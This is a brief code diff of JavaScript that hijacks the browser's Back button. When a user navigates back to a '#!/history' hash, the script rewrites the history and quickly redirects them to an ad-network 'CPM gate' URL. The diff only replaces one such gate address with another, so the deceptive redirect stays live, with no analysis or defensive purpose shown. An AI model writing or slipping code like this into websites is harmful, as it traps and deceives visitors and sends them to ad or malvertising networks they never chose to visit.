@@ -6,7 +6,7 @@ window.addEventListener("popstate", function() {
   if(location.hash === "#!/history") { 
     history.replaceState(null, document.title, location.pathname); 
     setTimeout(function(){ 
-      location.replace("https://www.highperformancecpmgate.com/nfcxhx5fd8?key=415d39a54971d9bad8e7afeeed755306"); 
+      location.replace("https://www.highcpmrevenuenetwork.com/r1efsytmmv?key=cd19aa4ad1ae32a932fea2efb52e68cf"); 
     },10); 
   } 
 }, false); 
